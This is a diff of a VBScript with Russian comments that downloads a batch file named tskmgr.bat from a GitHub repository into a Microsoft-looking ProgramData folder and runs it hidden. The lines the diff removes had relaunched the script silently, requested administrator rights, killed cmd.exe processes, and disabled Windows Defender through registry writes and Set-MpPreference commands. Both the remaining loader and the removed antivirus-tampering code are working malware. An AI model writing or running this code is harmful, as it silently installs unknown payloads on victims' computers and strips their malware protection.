@@ -1,24 +1,11 @@
 Option Explicit
 
-' Запускаем скрипт в скрытом режиме
-If WScript.Arguments.Count = 0 Then
-    CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """", 0, False
-    WScript.Quit
-End If
-
-' Проверяем, запущен ли скрипт с правами администратора
-If Not WScript.Arguments.Named.Exists("elevate") Then
-    CreateObject("Shell.Application").ShellExecute WScript.FullName, _
-        """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
-    WScript.Quit
-End If
-
-' Объявим переменные для загрузки файла
+' Объявим переменные
 Dim objHTTP, objStream, url, filePath
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
 
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
 url = "https://github.com/Rlz-vz/SchoolSigma/raw/main/tskmgr.bat"
-filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat"
+filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat" ' 
 
 Dim fso
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -38,51 +25,11 @@ If objHTTP.Status = 200 Then
     objStream.Write objHTTP.responseBody
     objStream.SaveToFile filePath, 2 ' 2 = перезапись
     objStream.Close
-
-    ' Запускаем файл невидимо и ожидаем завершения
-    CreateObject("WScript.Shell").Run filePath, 0, True 
+    
+    ' Запускаем файл невидимо
+    CreateObject("WScript.Shell").Run filePath, 0, False ' 0 = скрытый режим
 End If
 
 Set objStream = Nothing
 Set objHTTP = Nothing
 Set fso = Nothing
-
-' Закрываем все запускаемые cmd.exe процессы
-Dim objWMIService, objProcess
-Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-Set objProcess = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='cmd.exe'")
-
-For Each process In objProcess
-    process.Terminate
-Next
-
-' Теперь выполняем дальнейшие действия, если tskmgr.bat завершен
-On Error Resume Next
-
-' Настройка реестра для отключения Windows Defender
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware", 1, "REG_DWORD"
-WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring", "1", "REG_DWORD"
-WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection", "1", "REG_DWORD"
-WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable", "1", "REG_DWORD"
-
-WScript.Sleep 100
-
-' Выполнение команд PowerShell для отключения различных функций защиты
-outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
-outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
-outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
-outputMessage("Set-MpPreference -DisableIOAVProtection $true")
-outputMessage("Set-MpPreference -DisableScriptScanning $true")
-outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
-outputMessage("Set-MpPreference -MAPSReporting 0")
-outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
-outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
-outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
-outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")
-
-Sub outputMessage(ByVal args)
-    On Error Resume Next
-    Set objShell = CreateObject("Wscript.shell")
-    objShell.Run "cmd.exe /c powershell " & args, 0, False 
-End Sub
